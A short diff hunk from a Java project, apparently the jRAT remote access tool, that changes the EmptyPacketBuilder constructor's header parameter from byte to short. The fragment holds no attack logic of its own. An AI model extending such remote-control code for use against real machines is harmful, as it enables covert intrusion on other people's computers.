@@ -7,7 +7,7 @@ import jrat.api.Client;
 
 public class EmptyPacketBuilder extends PacketBuilder {
 
-	public EmptyPacketBuilder(byte header, Client rat) {
+	public EmptyPacketBuilder(short header, Client rat) {
 		super(header, rat);
 	}
 
